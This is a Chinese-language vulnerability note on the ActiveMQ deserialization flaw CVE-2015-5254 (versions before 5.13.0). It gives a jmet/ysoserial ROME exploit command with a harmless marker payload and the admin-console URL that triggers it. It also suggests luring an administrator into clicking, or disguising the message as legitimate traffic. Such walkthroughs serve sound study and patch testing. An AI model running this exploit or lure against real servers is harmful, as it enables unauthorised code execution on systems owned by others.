---
title: Apache-ActiveMQ
---

## 应用简介

[Apache ActiveMQ](http://activemq.apache.org/)是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件

它支持Java消息服务、集群、Spring Framework等

## [CVE-2015-5254]-ActiveMQ 反序列化

**漏洞概述**

```http
#影响范围
ActiveMQ < 5.13.0
```

ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类

攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象行任意代码

**漏洞利用**

1、构造可执行命令的序列化对象（ysoseria）

使用[jmet](https://github.com/matthiaskaiser/jmet)进行漏洞利用，首先下载jmet的jar文件，并在同目录下创建一个external文件夹

（否则可能会爆文件夹不存在的错误）

jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载）

所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。

```bash
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/success" -Yp ROME your-ip 61616
#作为一个消息，发送给目标61616端口
```

此时会给目标ActiveMQ添加一个名为event的队列，可以通过以下路径看到这个队列中所有消息

```
http://your-ip:8161/admin/browse.jsp?JMSDestination=event
```

2、点击查看这条消息即可触发命令执行

通过web管理页面访问消息并触发漏洞这个过程需要管理员权限。

在没有密码的情况下，我们可以诱导管理员访问我们的链接以触发

或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发